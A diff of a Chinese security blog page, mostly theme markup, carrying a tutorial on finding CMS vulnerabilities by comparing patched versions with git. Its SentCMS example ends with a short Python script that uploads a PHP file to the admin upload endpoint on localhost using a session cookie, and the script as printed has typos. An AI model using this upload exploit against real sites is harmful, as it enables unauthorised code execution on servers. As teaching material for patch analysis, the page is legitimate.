@@ -1,109 +1,250 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  
-  <title>寻找历史漏洞 | 青鸟 Blog</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前言对于著名cms 一旦爆出漏洞就算是xss 一天内都能看到漏洞分析文章和写好的利用代码。但是如果我们渗透测试的时候遇到了不怎么著名的cms  发现是历史版本 但是不能搜索到exp或者分析文章。我们就需要自己去进行补丁比较来发现漏洞 如何开始我们以SentCMS为例子 我们可以在码云下载到 下载地址  或者使用git clone https://gitee.com/sentcms/sentcms码">
-<meta name="keywords" content="web安全">
-<meta property="og:type" content="article">
-<meta property="og:title" content="寻找历史漏洞">
-<meta property="og:url" content="http://blue-bird1.github.io/2018/05/22/findbug/index.html">
-<meta property="og:site_name" content="青鸟 Blog">
-<meta property="og:description" content="前言对于著名cms 一旦爆出漏洞就算是xss 一天内都能看到漏洞分析文章和写好的利用代码。但是如果我们渗透测试的时候遇到了不怎么著名的cms  发现是历史版本 但是不能搜索到exp或者分析文章。我们就需要自己去进行补丁比较来发现漏洞 如何开始我们以SentCMS为例子 我们可以在码云下载到 下载地址  或者使用git clone https://gitee.com/sentcms/sentcms码">
-<meta property="og:locale" content="zh">
-<meta property="og:image" content="https://box.kancloud.cn/2001e78808bd4d60f0b7355e78b09fbe_628x162.png">
-<meta property="og:image" content="https://box.kancloud.cn/768d4ed85832725fdc7aea45e2699dfa_759x514.png">
-<meta property="og:updated_time" content="2018-05-31T01:27:22.518Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="寻找历史漏洞">
-<meta name="twitter:description" content="前言对于著名cms 一旦爆出漏洞就算是xss 一天内都能看到漏洞分析文章和写好的利用代码。但是如果我们渗透测试的时候遇到了不怎么著名的cms  发现是历史版本 但是不能搜索到exp或者分析文章。我们就需要自己去进行补丁比较来发现漏洞 如何开始我们以SentCMS为例子 我们可以在码云下载到 下载地址  或者使用git clone https://gitee.com/sentcms/sentcms码">
-<meta name="twitter:image" content="https://box.kancloud.cn/2001e78808bd4d60f0b7355e78b09fbe_628x162.png">
-  
-    <link rel="alternate" href="/atom.xml" title="青鸟 Blog" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
-  
-  
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
-  
-  <link rel="stylesheet" href="/css/style.css">
-  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
-  
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="bluebird">
+    
+    
+    
+    
+    
+    
+    <title>寻找历史漏洞 | 青鸟 Blog</title>
+    <link href=”http://blue-bird1.github.io“ rel=”prefetch” />
 
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/aos.css">
+<link rel="stylesheet" href="/css/style.css">
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/bootstrap.min.js"></script>
+    <script src="/js/aos.js"></script>
+    <script src="/js/highslide/highslide-full.min.js"></script>
+    <link rel="stylesheet" href="/js/highslide/highslide.css">
+    <style type="text/css">
+        @media (max-width: 768px) {
+            body {
+                background-color: #f0f0f0;
+                background: url('/imgs/xsbg.gif');
+                background-attachment: fixed;
+            }
+        }
+    </style>
+    
+    <!--<script type="text/javascript">
+      if (document.images) {
+        var avatar = new Image();
+        avatar.src = '/imgs/https:/avatars3.githubusercontent.com/u/31133259?s=460&v=4'
+        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg,preview5.jpg,preview6.jpg'.split(',')
+        var previewsPreLoad = []
+        for(var i = 0; i < length; i++) {
+          previewsPreLoad.push(new Image())
+          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
+        }
+      }
+    </script>-->
 </head>
-
 <body>
-  <div id="container">
-    <div id="wrap">
-      <div class="outer">
-        <div class="widget-wrap mobile-header">
-  <h3 class="widget-title"></h3>
-  <div class="widget">
-    <img class="avatar" src="https://avatars3.githubusercontent.com/u/31133259?s=460&amp;v=4">
-    <h2 class="author">bluebird</h2>
-    <h3 class="description"></h3>
-    <div class="count-box">
-      <a href="/archives"><div><strong>8</strong><br>文章</div></a>
-      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
-      <a href="/tags"><div><strong>5</strong><br>标签</div></a>
-    </div>
-    <ul class="blog-link">
-     
-          <a href="/" title="Home">
-            <li>主页</li>
-          </a>
-        
-          <a href="/archives" title="Archives">
-            <li>归档</li>
-          </a>
-        
-          <a href="/categories" title="Categories">
-            <li>分类</li>
-          </a>
-        
-          <a href="/tags" title="Tags">
-            <li>标签</li>
-          </a>
-        
+    <!-- 背景轮播图功能 -->
+    <section class="hidden-xs">
+    <ul class="cb-slideshow">
+        <li><span>天若</span></li>
+        <li><span>有情</span></li>
+        <li><span>天亦老</span></li>
+        <li><span>我为</span></li>
+        <li><span>长者</span></li>
+        <li><span>续一秒</span></li>
     </ul>
-  </div>
-</div>
-
-        <section id="main"><article id="post-findbug" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/05/22/findbug/" class="article-date">
-  <time class="post-time" datetime="2018-05-22T01:24:36.000Z" itemprop="datePublished">
-    <span class="post-month">5月</span><br/>
-    <span class="post-day">22</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
+</section>
+    <!-- 欧尼酱功能, 谁用谁知道 -->
     
-    
-      <header class="article-header">
-        
-  
-    <h1 class="article-title" itemprop="name">
-      寻找历史漏洞
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
+    <div class="gal-menu gal-dropdown">
+    <div class="circle" id="gal">
+        <div class="ring">
+            <a href="http://blue-bird1.github.io" class="menuItem" style="left: 50%; top: 15%;">首页</a>
+            
+            <a class="menuItem" style="left: 80.3109%; top: 32.5%;">下一页</a>
+            
+            <a href="/archives" class="menuItem" style="left: 80.3109%; top: 67.5%;">归档</a>
+            <a href="/about" class="menuItem" style="left: 50%; top: 85%;">关于</a>
+            <a href="/message" class="menuItem" style="left: 19.6891%; top: 67.5%;">留言板</a>
+            
+            <a class="menuItem" style="left: 19.6891%; top: 32.5%;">上一页</a>
+            
         </div>
-      </header>
+        <audio id="audio" src="/imgs/oni.mp3"></audio>
+    </div>
+</div>
     
-    <div class="article-entry" itemprop="articleBody">
-      
+    <header class="navbar navbar-inverse" id="gal-header">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed"
+                    data-toggle="collapse" data-target=".bs-navbar-collapse"
+                    aria-expanded="false">
+                <span class="fa fa-lg fa-reorder"></span>
+            </button>
+            <a href="http://blue-bird1.github.io">
+                
+                <style>
+                    #gal-header .navbar-brand {
+                        height: 54px;
+                        line-height: 24px;
+                        font-size: 28px;
+                        opacity: 1;
+                        background-color: rgba(0,0,0,0);
+                        text-shadow: 0 0 5px #fff,0 0 10px #fff,0 0 15px #fff,0 0 20px #228DFF,0 0 35px #228DFF,0 0 40px #228DFF,0 0 50px #228DFF,0 0 75px #228DFF;
+                    }
+                </style>
+                <!-- 这里使用文字(navbar_text or config.title) -->
+                <div class="navbar-brand">青鸟 Blog</div>
+                
+            </a>
+        </div>
+        <div class="collapse navbar-collapse bs-navbar-collapse">
+            <ul class="nav navbar-nav" id="menu-gal">
+                
+                
+                <li class="">
+                    <a href="/">
+                        <i class="fa fa-home"></i>首页
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>归档
+                    </a>
+                </li>
+                
+                
+                
+                
+                <li class="dropdown">
+                    <!-- TODO 添加hover dropdown效果 -->
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-list"></i>分类
+                    </a>
+                    <ul class="dropdown-menu">
+                        
+                        
+                        <li>
+                            <a href="/categories/网络安全/">网络安全</a>
+                        </li>
+                        
+                        
+                        
+                    </ul>
+                </li>
+                
+                
+                
+                
+                
+                <li class="dropdown">
+                    <!-- TODO 添加hover dropdown效果 -->
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-tags"></i>标签
+                    </a>
+                    <ul class="dropdown-menu">
+                        
+                        
+                        <li>
+                            <a href="/tags/web安全/">web安全</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/编程技术/">编程技术</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/web安全-漏洞分析/">web安全     漏洞分析</a>
+                        </li>
+                        
+                        
+                        <li>
+                            <a href="/tags">...</a>
+                        </li>
+                        
+                        
+                    </ul>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/about">
+                        <i class="fa fa-user"></i>关于我
+                    </a>
+                </li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</header>
+    <div id="gal-body">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8 gal-right" id="mainstay">
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="http://blue-bird1.github.io">青鸟 Blog</a>
+        >
+        <span>寻找历史漏洞</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2018/05/22/findbug/">寻找历史漏洞</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/web安全/">web安全</a>
+                
+            </span>
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2018-05-22
+            </span>
+            
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/2018/05/22/findbug/">寻找历史漏洞</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2018-05-22
+            </p>
+            <p>
+                
+                <i class="fa fa-tags"></i>
+                
+                <a href="/tags/web安全/">web安全</a>
+                
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
         <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于著名cms 一旦爆出漏洞就算是xss 一天内都能看到漏洞分析文章和写好的利用代码。<br>但是如果我们渗透测试的时候遇到了不怎么著名的cms  发现是历史版本 但是不能搜索到exp或者分析文章。我们就需要自己去进行补丁比较来发现漏洞</p>
 <h3 id="如何开始"><a href="#如何开始" class="headerlink" title="如何开始"></a>如何开始</h3><p>我们以<code>SentCMS</code>为例子 我们可以在码云下载到 <a href="https://gitee.com/sentcms/sentcms" target="_blank" rel="noopener">下载地址</a>  或者使用<br><code>git clone https://gitee.com/sentcms/sentcms</code><br>码云作为中国的github 自然是很方便。<br>但是如果不是通过git进行管理 也建议把下载的旧版本和老版本使用git进行管理<br>因为git的版本管理和提交对比非常实用 也方便保存进度</p>
 <p>大致的git操作是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git init  #初始化git仓库</span><br><span class="line">git add * #将旧版本全部文件添加</span><br><span class="line">git commit  # 作为初始提交</span><br><span class="line"># 将新版本覆盖到旧版本的操作 可能是 mv -r ../new/  . 或者其他操作</span><br><span class="line"># git status 可能你会想要查看一下文件差异</span><br><span class="line">git add * # 将全部文件改变添加</span><br><span class="line">git commit # 提交更改</span><br><span class="line"># git log 查看日志</span><br><span class="line"># git diff  查看差异</span><br></pre></td></tr></table></figure></p>
@@ -123,195 +264,313 @@
 <h3 id="python编写exp"><a href="#python编写exp" class="headerlink" title="python编写exp"></a>python编写exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &apos;http://127.0.0.1/sentcms/admin/Upload/Upload&apos;</span><br><span class="line">files = &#123;&apos;phpinfo.php&apos;: open(&apos;phpinfo.txt&apos;,&apos;rb&apos;)&#125;</span><br><span class="line"># 我本地cookeie</span><br><span class="line">cookie = &#123;&apos; remember_token&apos;:&apos;1|8b6075452c23faa1eba56fe61b89df391811d155e7578a40114732131c49d01341d8a7e30460891e6525292631bfa038a97e3d1d9f1290b345c60a6ac0ea1484&apos;,&apos;PHPSESSID&apos;:&apos;d4ubb72j0d9evlbktqqqct6ci2;&apos;&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url, files=file，cookies=cookie)</span><br></pre></td></tr></table></figure>
 <p>我们可以在<code>uploads\picture\20180521</code>找到一个，以微秒时间的md5编码为文件名的php文件</p>
 
-      
     </div>
-    <footer class="article-footer">
-      <a data-url="http://blue-bird1.github.io/2018/05/22/findbug/" data-id="cjihirrdy0005h8nx4caaq3c6" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
-
-    </footer>
-  </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/2018/05/31/一道简单题目/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          一道简单题目
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2018/02/05/metasploit-python-模块是如何运行/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">metasploit python 模块是如何运行</div>
-    </a>
-  
-</nav>
-
-  
 </article>
 
 
-
-</section>
-        
-          <aside id="sidebar">
-  
-    <div class="widget-wrap">
-  <h3 class="widget-title"></h3>
-  <div class="widget">
-    <h1 class="blog-title">青鸟 Blog</h1>
-    <h2 class="blog-subtitle">青鸟的Blog</h2>
-    <ul class="blog-link">
-     
-          <a href="/" title="Home">
-            <li>主页</li>
-          </a>
-        
-          <a href="/archives" title="Archives">
-            <li>归档</li>
-          </a>
-        
-          <a href="/categories" title="Categories">
-            <li>分类</li>
-          </a>
-        
-          <a href="/tags" title="Tags">
-            <li>标签</li>
-          </a>
-        
-    </ul>
-  </div>
-</div>
-
-  
-    <div class="widget-wrap">
-  <h3 class="widget-title"></h3>
-  <div class="widget">
-    <img class="avatar" src="https://avatars3.githubusercontent.com/u/31133259?s=460&amp;v=4">
-    <h2 class="author">bluebird</h2>
-    <h3 class="description"></h3>
-    <div class="count-box">
-      <a href="/archives"><div><strong>8</strong><br>文章</div></a>
-      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
-      <a href="/tags"><div><strong>5</strong><br>标签</div></a>
+                </div>
+                <aside class="col-md-4 gal-left" id="sidebar">
+    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
+<aside id="sidebar-search">
+    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <form class="form-inline clearfix" id="search-form" method="get"
+              action="/search/index.html">
+            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~">
+            <button class="btn btn-danger btn-gal" type="submit">
+                <i class="fa fa-search"></i>
+            </button>
+        </form>
     </div>
-
-
-
-    <div class="social-link">
-      
-        <a class="hvr-bounce-in" href="http://github.com/blue-bird1" target="_blank" title="Github">
-          Github
-        </a>
-      
-    </div>
-
-    <div class="friend-link">
-      <h2>友情链接</h2>
-      
-        <a class="hvr-bounce-in" href="https://jiaqiangbandongg.github.io/" target="_blank" title="李孟禹的日常">
-          李孟禹的日常
-        </a>
-      
-        <a class="hvr-bounce-in" href="https://zehuichen123.github.io/" target="_blank" title="loveSnowBest&#39;Blog">
-          loveSnowBest&#39;Blog
-        </a>
-      
-        <a class="hvr-bounce-in" href="http://yaoyaomeng.github.io" target="_blank" title="xyz&#39;blog">
-          xyz&#39;blog
-        </a>
-      
-        <a class="hvr-bounce-in" href="http://www.shallowdream.cn" target="_blank" title="小樱的博客">
-          小樱的博客
-        </a>
-      
-    </div>
-  </div>
-</div>
-
-  
 </aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy;2017 - 2018 bluebird<br>
-      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
-      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
-      
-    </div>
-    
-  </div>
-</footer>
-    </div>
-    
-
-<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
-<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
-<script>
-new WOW().init();
-</script>   
-
-
-  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
-  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
-
-
-
-  <link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
-  <script src="/plugin/galmenu/GalMenu.js"></script>
-  <div class="GalMenu GalDropDown">
-      <div class="circle" id="gal">
-        <div class="ring">
-          
-            <a href="/" title="" class="menuItem">首页</a>
-          
-            <a href="/archives" title="" class="menuItem">归档</a>
-          
+    <aside id="sidebar-author">
+    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
+        <div class="panel-heading" style="text-align: center">
+            <i class="fa fa-quote-left"></i>
+            bluebird
+            <i class="fa fa-quote-right"></i>
         </div>
-        
-          <audio id="audio" src="#"></audio>
-        
-      </div> 
+        <div class="author-panel text-center">
+            <img src="https://avatars3.githubusercontent.com/u/31133259?s=460&v=4" width="140" height="140"
+                 alt="个人头像" class="author-image">
+            <p class="author-description"></p>
+        </div>
+    </div>
+</aside>
+    
+    <aside id="sidebar-recent_comments">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-comments"></i>
+            最新评论
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush"></ul>
+    </div>
+</aside>
+    
+    <!-- 要配置好leancloud才能开启此小工具 -->
+    
+    
+    <aside id="sidebar-recent_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            近期文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/06/12/pycharm/">pycharm插件</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/06/05/newpost/">i春秋61挑战 wp</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/05/31/一道简单题目/">一道简单题目</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/05/22/findbug/">寻找历史漏洞</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/02/05/metasploit-python-模块是如何运行/">metasploit python 模块是如何运行</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/02/02/metasploit-python-模块/">metasploit python 模块</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2017/11/28/metinfo3-5-19后台getshell分析/">metinfo3.5.19后台getshell分析</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2017/11/25/metinfoexp/">metinfo3.5.18后台getshell分析</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="sidebar-rand_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            随机文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/05/22/findbug/">寻找历史漏洞</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/02/02/metasploit-python-模块/">metasploit python 模块</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2017/11/25/metinfoexp/">metinfo3.5.18后台getshell分析</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/06/12/pycharm/">pycharm插件</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/06/05/newpost/">i春秋61挑战 wp</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/02/05/metasploit-python-模块是如何运行/">metasploit python 模块是如何运行</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/05/31/一道简单题目/">一道简单题目</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2017/11/28/metinfo3-5-19后台getshell分析/">metinfo3.5.19后台getshell分析</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="gal-sets">
+        <div class="panel panel-gal hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+            <ul class="nav nav-pills pills-gal">
+                <li class="">
+                    <a href="/2018/05/22/findbug/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                </li>
+                <li class="">
+                    <a href="/2018/05/22/findbug/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                </li>
+                <li class="">
+                    <a href="/2018/05/22/findbug/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                </li>
+            </ul>
+            <div class="tab-content">
+                <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
+    
+    <a href="/tags/web安全/" style="font-size: 16.19191130045897px;" class="tag-cloud-link">web安全</a>
+    
+    <a href="/tags/编程技术/" style="font-size: 16.64629936722848px;" class="tag-cloud-link">编程技术</a>
+    
+    <a href="/tags/web安全-漏洞分析/" style="font-size: 17.504440931961092px;" class="tag-cloud-link">web安全     漏洞分析</a>
+    
+    <a href="/tags/编程开发/" style="font-size: 10.615313167937497px;" class="tag-cloud-link">编程开发</a>
+    
+    <a href="/tags/web安全-漏洞分析/" style="font-size: 19.636617941249362px;" class="tag-cloud-link">web安全    漏洞分析</a>
+    
 </div>
-<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
-  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
-    for (var i = 0,
-    l = items.length; i < l; i++) {
-      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
-      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
-    }</script>
-<script type="text/javascript">
-  $(document).ready(function() {
-    $('body').GalMenu({
-      'menu': 'GalDropDown'
-    })
-  });
-</script>
+                <div class="friend-links tab-pane nav bs-sidenav fade" id="sidebar-friend-links">
+    
+    <li>
+        <a href="http://kdays.net/days/" target="_blank">KDays Forum</a>
+    </li>
+    
+    <li>
+        <a href="https://jiaqiangbandongg.github.io/" target="_blank">李孟禹的日常</a>
+    </li>
+    
+    <li>
+        <a href="https://zehuichen123.github.io/" target="_blank">loveSnowBest&#39;Blog</a>
+    </li>
+    
+    <li>
+        <a href="http://yaoyaomeng.github.io" target="_blank">xyz&#39;blog</a>
+    </li>
+    
+    <li>
+        <a href="http://www.shallowdream.cn" target="_blank">小樱的博客</a>
+    </li>
+    
+</div>
+                <div class="links tab-pane nav bs-sidenav fade" id="sidebar-links">
+    
+    <li>
+        <a href="http://github.com/blue-bird1" target="_blank">Github</a>
+    </li>
+    
+    <li>
+        <a href="https://twitter.com/blue_bird__hc" target="_blank">Twitter</a>
+    </li>
+    
+</div>
+            </div>
+        </div>
+    </aside>
+    
+</aside>
+            </div>
+        </div>
+    </div>
+    <footer id="gal-footer">
+    <div class="container">
+        Copyright © 2018 bluebird Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+    </div>
+</footer>
 
-  <section class="hidden-xs"> 
-  <ul class="cb-slideshow"> 
-    <li><span>苟利</span></li> 
-    <li><span>国家</span></li> 
-    <li><span>生死以</span></li> 
-    <li><span>岂能</span></li> 
-    <li><span>祸福</span></li> 
-    <li><span>趋避之</span></li> 
-  </ul>
-</section>
-<script src="/js/script.js"></script>
-
-
-
-  </div>
+<!-- 回到顶端 -->
+<div id="gal-gotop">
+    <i class="fa fa-angle-up"></i>
+</div>
 </body>
+<script src="/js/activate-power-mode.js"></script>
+<script>
+
+    // 配置highslide
+	hs.graphicsDir = '/js/highslide/graphics/'
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.lang.number = '共%2张图, 当前是第%1张';
+    hs.addSlideshow({
+      interval: 5000,
+      repeat: true,
+      useControls: true,
+      fixedControls: "fit",
+      overlayOptions: {
+        opacity: 0.75,
+        position: "bottom center",
+        hideOnMouseOut: true
+      }
+    })
+
+    // 初始化aos
+    AOS.init({
+      duration: 1000,
+      delay: 0,
+      easing: 'ease-out-back'
+    });
+
+</script>
+<script>
+	POWERMODE.colorful = 'true';    // make power mode colorful
+	POWERMODE.shake = 'true';       // turn off shake
+	// TODO 这里根据具体情况修改
+	document.body.addEventListener('input', POWERMODE);
+</script>
+<script>
+    window.slideConfig = {
+      prefix: '/imgs/slide/background',
+      ext: 'jpg',
+      maxCount: '6'
+    }
+</script>
+<script src="/js/hs.js"></script>
+<script src="/js/blog.js"></script>
+
+<script src="/js/oni.js"></script>
+
+
+
 </html>
